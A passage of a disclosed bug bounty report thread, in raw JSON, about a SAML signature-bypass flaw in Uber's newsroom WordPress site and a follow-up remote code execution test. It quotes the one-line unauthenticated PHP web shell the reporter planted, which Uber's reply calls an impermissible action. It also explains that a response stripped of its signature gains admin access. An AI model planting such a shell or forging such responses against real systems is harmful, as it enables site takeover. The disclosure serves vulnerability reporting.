class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n       \u003cspan class=\"c1\"\u003e// verify signature\u003c/span\u003e\n   \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIf the tag is left out, then the plugin accepts any \u0026quot;authentication OK\u0026quot; response without checking if it\u0026#39;s coming from a trusted source.\u003c/p\u003e\n\n\u003cp\u003eThe above XML may have some unnecessary data. I just took a valid OneLogin response and removed the \u0026lt;ds:Signature /\u0026gt; tag, plus some others.\u003c/p\u003e\n","bounty_amount":"10000.0","formatted_bounty":"$10,000","weakness":{"id":27,"name":"Improper Authentication - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":91386,"file_name":"newsroom.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/091/386/94aa2135022d5eadc88e487a9788589632f8640a/newsroom.png?response-content-disposition=attachment%3B%20filename%3D%22newsroom.png%22%3B%20filename%2A%3DUTF-8%27%27newsroom.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ6SZWJ7EV%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T042621Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDnUzI%2BFGOFBLAScWuVOL4Lj3JmbbQAzP3Z0CGixtLCuAIgQzjjEEfRLfyvyTUcWPuh1TmLwtvXfhn4Y1cmYaMrO6cqtAMIVRABGgwwMTM2MTkyNzQ4NDkiDGp%2BpnVA5musWTL7NCqRA8%2FtWDfuTNl%2BTEZ8%2F83sOgEjGfhPO7hqas9S5YFvyrG29udKPmtcuewMHQFGoWh6uvbSTE9LPEkFDl6RosJJJY3ZsFaD9BGxtIOBINUPfZd26XnOL01fuCQ8x%2BiErJvv8vHBR5mWXV7L6t7A2%2F5H8dY91iEQFmPdZboRnRed4t2q9jcZCwrkzHwMk8bNRFkfRqzqUB6%2Buk39e4oyKwiyqROwDwnoUxIOrVdA29STuUYzszGBQ%2B3Eg%2Fr4I9Ys7sDaoYDHJAVEt%2F6kVnewTLU3uHfL%2F%2FzDR0ZnJa5Oo%2BmValn4%2Fn34Ke7o7csnn3piiGYIK4mihEWUVtJZnq0bZ%2BEU14q4ZLfb79tvTTKy5%2B9XC3vM1tWdFU6K%2F2PISAY5LoVEscNgJL0aQIq7sAX0f00Uyo2TeQTR%2B9TUOeUvW40metpNAt6ZQ8u0%2BuTZij%2FLNaYEe6v5RA7Fg8wzm%2Bu7IVusddMT4HgUuba3afxdFVj8x9iXROa6QZZ%2BdlHYNGywE8eJxO3jkpwbaZpUg8PZ17ztcb5%2BMLHSqv8FOusBshs3Z1RNetRK0o6yVAL2zGdldUlxbnMrusEP31v5WyfcSXKYrW1oJGSAAOlTEHZOawyDOEVKZdmLftLsa7vpv4NkkvDc0MjvNZjQrLWiuTmEalVC704buBLYftchmedTLOrsCMIpwWkxoPJnEqO2VZwPnup4B1lMH%2B%2FHO0btRwbDEfX1bZu7nae%2FPoCvN9o%2FT1iQ8GcaSv5OUJxppuy2cagjSuiUWEkOXPhYiBKpxTQMFIMtd6%2FpRtJ2YeCQgmRXXl1K6ayBDQAQxWFeKQPM5vtrAzDrzE9Adaqtb3AdlxqDjg74xdcM9YFdyg%3D%3D\u0026X-Amz-Signature=4fbf58170aea6e520b238f7f4536c5aa94729b85af3466e2971c4fadad3b4627","file_size":430282,"type":"image/png"},{"id":91387,"file_name":"newsroom3.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/091/387/fad82e776d93c2695a14567f5357bc86f4e1a021/newsroom3.png?response-content-disposition=attachment%3B%20filename%3D%22newsroom3.png%22%3B%20filename%2A%3DUTF-8%27%27newsroom3.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ6SZWJ7EV%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T042621Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDnUzI%2BFGOFBLAScWuVOL4Lj3JmbbQAzP3Z0CGixtLCuAIgQzjjEEfRLfyvyTUcWPuh1TmLwtvXfhn4Y1cmYaMrO6cqtAMIVRABGgwwMTM2MTkyNzQ4NDkiDGp%2BpnVA5musWTL7NCqRA8%2FtWDfuTNl%2BTEZ8%2F83sOgEjGfhPO7hqas9S5YFvyrG29udKPmtcuewMHQFGoWh6uvbSTE9LPEkFDl6RosJJJY3ZsFaD9BGxtIOBINUPfZd26XnOL01fuCQ8x%2BiErJvv8vHBR5mWXV7L6t7A2%2F5H8dY91iEQFmPdZboRnRed4t2q9jcZCwrkzHwMk8bNRFkfRqzqUB6%2Buk39e4oyKwiyqROwDwnoUxIOrVdA29STuUYzszGBQ%2B3Eg%2Fr4I9Ys7sDaoYDHJAVEt%2F6kVnewTLU3uHfL%2F%2FzDR0ZnJa5Oo%2BmValn4%2Fn34Ke7o7csnn3piiGYIK4mihEWUVtJZnq0bZ%2BEU14q4ZLfb79tvTTKy5%2B9XC3vM1tWdFU6K%2F2PISAY5LoVEscNgJL0aQIq7sAX0f00Uyo2TeQTR%2B9TUOeUvW40metpNAt6ZQ8u0%2BuTZij%2FLNaYEe6v5RA7Fg8wzm%2Bu7IVusddMT4HgUuba3afxdFVj8x9iXROa6QZZ%2BdlHYNGywE8eJxO3jkpwbaZpUg8PZ17ztcb5%2BMLHSqv8FOusBshs3Z1RNetRK0o6yVAL2zGdldUlxbnMrusEP31v5WyfcSXKYrW1oJGSAAOlTEHZOawyDOEVKZdmLftLsa7vpv4NkkvDc0MjvNZjQrLWiuTmEalVC704buBLYftchmedTLOrsCMIpwWkxoPJnEqO2VZwPnup4B1lMH%2B%2FHO0btRwbDEfX1bZu7nae%2FPoCvN9o%2FT1iQ8GcaSv5OUJxppuy2cagjSuiUWEkOXPhYiBKpxTQMFIMtd6%2FpRtJ2YeCQgmRXXl1K6ayBDQAQxWFeKQPM5vtrAzDrzE9Adaqtb3AdlxqDjg74xdcM9YFdyg%3D%3D\u0026X-Amz-Signature=c21d2e6275b85a925d2483d7d3cac93c0366829e005af487df99380f1c706630","file_size":64215,"type":"image/png"}],"allow_singular_disclosure_at":"2016-06-06T09:53:44.967Z","allow_singular_disclosure_after":-144009156.73114356,"singular_disclosure_allowed":true,"vote_count":47,"voters":["sultancad","stefanofinding","jouko","jobert","hunter","michiel","floerer","bogdantcaciuc","troubleshooter","zombiehelp54","and 37 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":939820,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Admin Dashboard","markdown_message":"\u003cp\u003eAdmin Dashboard\u003c/p\u003e\n","automated_response":false,"created_at":"2016-05-04T07:31:16.815Z","updated_at":"2016-05-04T07:31:16.815Z","actor":{"username":"jouko","cleared":false,"url":"/jouko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":91390,"filename":"newsroom2.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/091/390/cb43b0818ab6d32477cb571801e7b00e8a9603bc/newsroom2.png?response-content-disposition=attachment%3B%20filename%3D%22newsroom2.png%22%3B%20filename%2A%3DUTF-8%27%27newsroom2.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ6SZWJ7EV%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T042621Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDnUzI%2BFGOFBLAScWuVOL4Lj3JmbbQAzP3Z0CGixtLCuAIgQzjjEEfRLfyvyTUcWPuh1TmLwtvXfhn4Y1cmYaMrO6cqtAMIVRABGgwwMTM2MTkyNzQ4NDkiDGp%2BpnVA5musWTL7NCqRA8%2FtWDfuTNl%2BTEZ8%2F83sOgEjGfhPO7hqas9S5YFvyrG29udKPmtcuewMHQFGoWh6uvbSTE9LPEkFDl6RosJJJY3ZsFaD9BGxtIOBINUPfZd26XnOL01fuCQ8x%2BiErJvv8vHBR5mWXV7L6t7A2%2F5H8dY91iEQFmPdZboRnRed4t2q9jcZCwrkzHwMk8bNRFkfRqzqUB6%2Buk39e4oyKwiyqROwDwnoUxIOrVdA29STuUYzszGBQ%2B3Eg%2Fr4I9Ys7sDaoYDHJAVEt%2F6kVnewTLU3uHfL%2F%2FzDR0ZnJa5Oo%2BmValn4%2Fn34Ke7o7csnn3piiGYIK4mihEWUVtJZnq0bZ%2BEU14q4ZLfb79tvTTKy5%2B9XC3vM1tWdFU6K%2F2PISAY5LoVEscNgJL0aQIq7sAX0f00Uyo2TeQTR%2B9TUOeUvW40metpNAt6ZQ8u0%2BuTZij%2FLNaYEe6v5RA7Fg8wzm%2Bu7IVusddMT4HgUuba3afxdFVj8x9iXROa6QZZ%2BdlHYNGywE8eJxO3jkpwbaZpUg8PZ17ztcb5%2BMLHSqv8FOusBshs3Z1RNetRK0o6yVAL2zGdldUlxbnMrusEP31v5WyfcSXKYrW1oJGSAAOlTEHZOawyDOEVKZdmLftLsa7vpv4NkkvDc0MjvNZjQrLWiuTmEalVC704buBLYftchmedTLOrsCMIpwWkxoPJnEqO2VZwPnup4B1lMH%2B%2FHO0btRwbDEfX1bZu7nae%2FPoCvN9o%2FT1iQ8GcaSv5OUJxppuy2cagjSuiUWEkOXPhYiBKpxTQMFIMtd6%2FpRtJ2YeCQgmRXXl1K6ayBDQAQxWFeKQPM5vtrAzDrzE9Adaqtb3AdlxqDjg74xdcM9YFdyg%3D%3D\u0026X-Amz-Signature=1b74d5e59458c1eae317d0292d4ec4aab435c8138d1241ddbad5f1d192bb1582"}],"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":940435,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yikes, that's not good - investigating this now.","markdown_message":"\u003cp\u003eYikes, that\u0026#39;s not good - investigating this now.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-05-04T16:08:17.897Z","updated_at":"2016-05-04T16:08:17.897Z","actor":{"username":"mandatoryuber","cleared":false,"url":"/mandatoryuber","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/287/fe7ca43da855a13d789192535962231dc7bee6ec_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":940439,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Triaging, we should have a response on this later today.","markdown_message":"\u003cp\u003eTriaging, we should have a response on this later today.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-05-04T16:15:21.852Z","updated_at":"2016-05-04T16:15:21.852Z","actor":{"username":"mandatoryuber","cleared":false,"url":"/mandatoryuber","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/287/fe7ca43da855a13d789192535962231dc7bee6ec_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":940502,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The screenshots show a PoC of getting site admin, but logging on with a Network/Super Admin's email address (which was visible in the users list) grants that privilege and more attack surface.\n\nWhile I was there I also tested the WPEngine RCE vector that has remained unconfirmed by you, reported at #134907. Although the system() PHP function didn't directly work, I was able to create a PHP script with arbitrary contents under the webroot. This would allow full control of the databases, reading or writing any file as the www-data user, inside or outside webroot, installing PHP backdoors/shells, access to all web traffic, etc.\n","markdown_message":"\u003cp\u003eThe screenshots show a PoC of getting site admin, but logging on with a Network/Super Admin\u0026#39;s email address (which was visible in the users list) grants that privilege and more attack surface.\u003c/p\u003e\n\n\u003cp\u003eWhile I was there I also tested the WPEngine RCE vector that has remained unconfirmed by you, reported at \u003ca href=\"/reports/134907\"\u003e#134907\u003c/a\u003e. Although the system() PHP function didn\u0026#39;t directly work, I was able to create a PHP script with arbitrary contents under the webroot. This would allow full control of the databases, reading or writing any file as the www-data user, inside or outside webroot, installing PHP backdoors/shells, access to all web traffic, etc.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-05-04T16:53:25.228Z","updated_at":"2016-05-04T16:53:25.228Z","actor":{"username":"jouko","cleared":false,"url":"/jouko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":91480,"filename":"newsroom5.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/091/480/35bfd373c78ee41bacc5aa480566f09a26b0ed7f/newsroom5.png?response-content-disposition=attachment%3B%20filename%3D%22newsroom5.png%22%3B%20filename%2A%3DUTF-8%27%27newsroom5.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ6SZWJ7EV%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T042621Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDnUzI%2BFGOFBLAScWuVOL4Lj3JmbbQAzP3Z0CGixtLCuAIgQzjjEEfRLfyvyTUcWPuh1TmLwtvXfhn4Y1cmYaMrO6cqtAMIVRABGgwwMTM2MTkyNzQ4NDkiDGp%2BpnVA5musWTL7NCqRA8%2FtWDfuTNl%2BTEZ8%2F83sOgEjGfhPO7hqas9S5YFvyrG29udKPmtcuewMHQFGoWh6uvbSTE9LPEkFDl6RosJJJY3ZsFaD9BGxtIOBINUPfZd26XnOL01fuCQ8x%2BiErJvv8vHBR5mWXV7L6t7A2%2F5H8dY91iEQFmPdZboRnRed4t2q9jcZCwrkzHwMk8bNRFkfRqzqUB6%2Buk39e4oyKwiyqROwDwnoUxIOrVdA29STuUYzszGBQ%2B3Eg%2Fr4I9Ys7sDaoYDHJAVEt%2F6kVnewTLU3uHfL%2F%2FzDR0ZnJa5Oo%2BmValn4%2Fn34Ke7o7csnn3piiGYIK4mihEWUVtJZnq0bZ%2BEU14q4ZLfb79tvTTKy5%2B9XC3vM1tWdFU6K%2F2PISAY5LoVEscNgJL0aQIq7sAX0f00Uyo2TeQTR%2B9TUOeUvW40metpNAt6ZQ8u0%2BuTZij%2FLNaYEe6v5RA7Fg8wzm%2Bu7IVusddMT4HgUuba3afxdFVj8x9iXROa6QZZ%2BdlHYNGywE8eJxO3jkpwbaZpUg8PZ17ztcb5%2BMLHSqv8FOusBshs3Z1RNetRK0o6yVAL2zGdldUlxbnMrusEP31v5WyfcSXKYrW1oJGSAAOlTEHZOawyDOEVKZdmLftLsa7vpv4NkkvDc0MjvNZjQrLWiuTmEalVC704buBLYftchmedTLOrsCMIpwWkxoPJnEqO2VZwPnup4B1lMH%2B%2FHO0btRwbDEfX1bZu7nae%2FPoCvN9o%2FT1iQ8GcaSv5OUJxppuy2cagjSuiUWEkOXPhYiBKpxTQMFIMtd6%2FpRtJ2YeCQgmRXXl1K6ayBDQAQxWFeKQPM5vtrAzDrzE9Adaqtb3AdlxqDjg74xdcM9YFdyg%3D%3D\u0026X-Amz-Signature=f43adad7cad551cc996e6789a791258ea55eebffe7104eb9917a1e52d65cbfa5"}],"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":940505,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hey @jouko this should now be patched for `newsroom.uber.com` (I just hotpatched it in prod) can you confirm the fix? We're investigating the rest of our WP instances now to see if this is systemic.","markdown_message":"\u003cp\u003eHey \u003ca href=\"/jouko\"\u003e@jouko\u003c/a\u003e this should now be patched for \u003ccode\u003enewsroom.uber.com\u003c/code\u003e (I just hotpatched it in prod) can you confirm the fix? We\u0026#39;re investigating the rest of our WP instances now to see if this is systemic.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-05-04T16:56:25.090Z","updated_at":"2016-05-04T16:56:25.090Z","actor":{"username":"mandatoryuber","cleared":false,"url":"/mandatoryuber","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/287/fe7ca43da855a13d789192535962231dc7bee6ec_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"jouko","url":"/jouko"},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":940506,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"What was the PHP script you created?","markdown_message":"\u003cp\u003eWhat was the PHP script you created?\u003c/p\u003e\n","automated_response":false,"created_at":"2016-05-04T16:57:30.618Z","updated_at":"2016-05-04T16:57:30.618Z","actor":{"username":"mandatoryuber","cleared":false,"url":"/mandatoryuber","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/287/fe7ca43da855a13d789192535962231dc7bee6ec_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":940526,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"https://newsroom.uber.com/bugb.php","markdown_message":"\u003cp\u003e\u003ca title=\"https://newsroom.uber.com/bugb.php\" href=\"/redirect?url=https%3A%2F%2Fnewsroom.uber.com%2Fbugb.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://newsroom.uber.com/bugb.php\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2016-05-04T17:18:09.951Z","updated_at":"2016-05-04T17:18:09.951Z","actor":{"username":"jouko","cleared":false,"url":"/jouko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":940529,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yes seems to be patched now.","markdown_message":"\u003cp\u003eYes seems to be patched now.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-05-04T17:19:10.114Z","updated_at":"2016-05-04T17:19:10.114Z","actor":{"username":"jouko","cleared":false,"url":"/jouko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":940540,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Nice, I'll triage the other report shortly as well.","markdown_message":"\u003cp\u003eNice, I\u0026#39;ll triage the other report shortly as well.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-05-04T17:24:38.331Z","updated_at":"2016-05-04T17:24:38.331Z","actor":{"username":"mandatoryuber","cleared":false,"url":"/mandatoryuber","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/287/fe7ca43da855a13d789192535962231dc7bee6ec_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":942919,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"\u003eFirst, I'm sorry about reporting another WordPress bug\n\nAs a small comment @jouko please dont be sorry, we very much want any reports (especially from you as an articulate reporter). We just had to be clear about what we saw as impact for wordpress issue. ","markdown_message":"\u003cblockquote\u003e\n\u003cp\u003eFirst, I\u0026#39;m sorry about reporting another WordPress bug\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eAs a small comment \u003ca href=\"/jouko\"\u003e@jouko\u003c/a\u003e please dont be sorry, we very much want any reports (especially from you as an articulate reporter). We just had to be clear about what we saw as impact for wordpress issue. \u003c/p\u003e\n","automated_response":false,"created_at":"2016-05-05T21:28:11.641Z","updated_at":"2016-05-05T21:28:11.641Z","actor":{"username":"notcollin","cleared":false,"url":"/notcollin","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":945075,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-05-07T09:53:44.901Z","updated_at":"2016-05-07T09:53:44.901Z","first_to_agree":true,"actor":{"username":"jouko","cleared":false,"url":"/jouko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":947937,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Hey @jouko we're rewarding our max bounty for this one due to the chain with the shared JavaScript with `team.uberinternal.com`. We recognized the chained JavaScript source elevates the impact in this case (and rewarded this bug accordingly).\n\nOne important thing we'd like to add is that during the investigation of the issue we noticed that you placed an unauthenticated web shell into our web root (`bugb.php`) which could've been used by other malicious users to compromise our website:\n```php\n\u003c?php eval($_POST[\"php\"]);?\u003e\n```\nWe'd like to let you know that this is **not** an allowed action and future actions of this nature can result in removal from the program and was not necessary to demonstrate remote code execution on the server.","markdown_message":"\u003cp\u003eHey \u003ca href=\"/jouko\"\u003e@jouko\u003c/a\u003e we\u0026#39;re rewarding our max bounty for this one due to the chain with the shared JavaScript with \u003ccode\u003eteam.uberinternal.com\u003c/code\u003e. We recognized the chained JavaScript source elevates the impact in this case (and rewarded this bug accordingly).\u003c/p\u003e\n\n\u003cp\u003eOne important thing we\u0026#39;d like to add is that during the investigation of the issue we noticed that you placed an unauthenticated web shell into our web root (\u003ccode\u003ebugb.php\u003c/code\u003e) which could\u0026#39;ve been used by other malicious users to compromise our website:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?php\u003c/span\u003e \u003cspan class=\"k\"\u003eeval\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$_POST\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;php\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e]);\u003c/span\u003e\u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWe\u0026#39;d like to let you know that this is \u003cstrong\u003enot\u003c/strong\u003e an allowed action and future actions of this nature can result in removal from the program and was not necessary to demonstrate remote code execution on the server.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-05-09T22:18:47.189Z","updated_at":"2016-05-09T22:18:47.189Z","actor":{"url":"/uber","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Uber"}},"bounty_amount":"10000.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"uber","collaborator":{"username":"jouko","url":"/jouko"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":948045,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks. I'd like to make it clear that there was nothing malicious about placing the script. As you can read above, I notified you about creating it right away. It seemed necessary in context of report #134907.\n\nYou had previously lowered my bounties based e.g. on the assumption (as I was told weeks later) that my reports were wrong and RCE was actually not possible via admin XSS on WPEngine. Solving this question was the purpose of report #134907.\n\nI expected you could still continue arguing that RCE wasn't possible because I had \"only\" demonstrated evaluating arbitrary PHP and dangerous PHP functions are supposedly disabled on WPEngine. It seemed important to find a bug in that interface too in order to demonstrate proper RCE.\n\nI thought creating this kind of script was the simplest, safest, and least intrusive way to test various PHP functions. It's true that someone *could* have guessed the path of the script and the parameter it requires, but this didn't seem realistic, especially within the short time frame I expected to need it. As you quickly removed it however, I continued experimenting on a WPEngine instance which I set up on my own expense. \n","markdown_message":"\u003cp\u003eThanks. I\u0026#39;d like to make it clear that there was nothing malicious about placing the script. As you can read above, I notified you about creating it right away. It seemed necessary in context of report \u003ca href=\"/reports/134907\"\u003e#134907\u003c/a\u003e.\u003c/p\u003e\n\n\u003cp\u003eYou had previously lowered my bounties based e.g. on the assumption (as I was told weeks later) that my reports were wrong and RCE was actually not possible via admin XSS on WPEngine. Solving this question was the purpose of report \u003ca href=\"/reports/134907\"\u003e#134907\u003c/a\u003e.\u003c/p\u003e\n\n\u003cp\u003eI expected you could still continue arguing that RCE wasn\u0026#39;t possible because I had \u0026quot;only\u0026quot; demonstrated evaluating arbitrary PHP and dangerous PHP functions are supposedly disabled on WPEngine. It seemed important to find a bug in that interface too in order to demonstrate proper RCE.\u003c/p\u003e\n\n\u003cp\u003eI thought creating this kind of script was the simplest, safest, and least intrusive way to test various PHP functions. It\u0026#39;s true that someone \u003cem\u003ecould\u003c/em\u003e have guessed the path of the script and the parameter it requires, but this didn\u0026#39;t seem realistic, especially within the short time frame I expected to need it. As you quickly removed it however, I continued experimenting on a WPEngine instance which I set up on my own expense. \u003c/p\u003e\n","automated_response":false,"created_at":"2016-05-09T23:36:21.145Z","updated_at":"2016-05-09T23:36:21.145Z","actor":{"username":"jouko","cleared":false,"url":"/jouko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":955860,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"FYI I was writing a note to Onelogin but then noticed that this bug doesn't affect the latest versions. I tried to track the fix on Github. Apparently [this](https://github.com/onelogin/wordpress-saml/commit/b102b16ce29ed92d2c4677ca491c6bbe33ee25fa) patch addresses the bug but Onelogin (or anyone else) hasn't mentioned the vulnerability in public as far as I can see.","markdown_message":"\u003cp\u003eFYI I was writing a note to Onelogin but then noticed that this bug doesn\u0026#39;t affect the latest versions. I tried to track the fix on Github. Apparently \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fonelogin%2Fwordpress-saml%2Fcommit%2Fb102b16ce29ed92d2c4677ca491c6bbe33ee25fa\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ethis\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e patch addresses the bug but Onelogin (or anyone else) hasn\u0026#39;t mentioned the vulnerability in public as far as I can 